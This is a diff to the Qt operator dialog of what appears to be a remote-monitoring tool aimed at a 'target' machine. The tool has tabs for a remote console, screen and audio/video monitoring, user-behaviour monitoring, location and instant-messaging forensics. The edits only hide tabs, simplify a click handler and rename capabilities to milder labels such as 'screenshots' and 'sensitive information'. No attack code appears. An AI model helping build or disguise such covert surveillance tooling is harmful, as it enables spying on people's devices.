@@ -114,8 +114,7 @@ TargetDlg::TargetDlg(Target* target)
 	InitConnection();
 
 	// 检测用
-	ui.trMissionStatus->topLevelItem(0)->child(4)->setHidden(true);
-	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
+	ui.trMissionStatus->topLevelItem(4)->setHidden(true);
 	if ( SYSTEM_WINDOWS == GetSystemType(this->tarBlock->dwOsBuildNumber) )
 	{
 		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")));
@@ -125,6 +124,11 @@ TargetDlg::TargetDlg(Target* target)
 	{
 		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
 	}
+
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("日志记录")));
+	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("文件控制")), QString::fromLocal8Bit("文件浏览"));
+	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")), QString::fromLocal8Bit("敏感信息"));
+	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")), QString::fromLocal8Bit("屏幕截图"));
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -422,12 +426,12 @@ void TargetDlg::DispatchTabInit(int index)
 
 	std::map<std::wstring, INIT_FUNC> initMap;
 
-	initMap[L"文件控制"] = &TargetDlg::InitFileCtrl;
+	initMap[L"文件浏览"] = &TargetDlg::InitFileCtrl;
 	initMap[L"远程控制台"] = &TargetDlg::InitRemoteCmd;
 	initMap[L"任务状态"] = &TargetDlg::InitTaskStatus;
-	initMap[L"用户行为监控"] = &TargetDlg::InitUserActionMonitor;
+	initMap[L"敏感信息"] = &TargetDlg::InitUserActionMonitor;
 	initMap[L"高级文件监控"] = &TargetDlg::InitAdvanceFileMonitor;
-	initMap[L"屏幕监控"] = &TargetDlg::InitScreenshot;
+	initMap[L"屏幕截图"] = &TargetDlg::InitScreenshot;
 	initMap[L"音视频监控"] = &TargetDlg::InitMultimedia;
 	initMap[L"日志记录"] = &TargetDlg::InitLogInfo;
 	initMap[L"地图定位"] = &TargetDlg::InitMapInfo;
@@ -493,15 +497,15 @@ void TargetDlg::onCmbLocalDirIndexChanged(int index)
 //
 void TargetDlg::onTrMissionStatusItemClicked(QTreeWidgetItem* item, int column)
 {
-	if ( NULL != item->parent() )
-	{
-		ui.stkMissionStatus->setCurrentIndex(item->parent()->indexOfChild(item));
-		ui.lbMissionStatus->setText(item->parent()->text(0));
-	}
-	else
-	{
-		ui.lbMissionStatus->setText(item->text(0));
-	}
+	//if ( NULL != item->parent() )
+	//{
+		ui.stkMissionStatus->setCurrentIndex(ui.trMissionStatus->indexOfTopLevelItem(item));
+	//	ui.lbMissionStatus->setText(item->parent()->text(0));
+	//}
+	//else
+	//{
+	//	ui.lbMissionStatus->setText(item->text(0));
+	//}
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -805,6 +809,11 @@ void TargetDlg::InitWidgetAppearance()
 	ui.tbUploadPluginList->setStyle(nofocusStyle);
 	ui.tbPluginData->setStyle(nofocusStyle);
 	ui.cmbLocalDir->setStyle(nofocusStyle);
+
+	ui.tabMain->setStyleSheet("");
+	ui.frame_4->hide();
+	setStyleSheet("");
+	ui.tabMain->setTabPosition(QTabWidget::South);
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
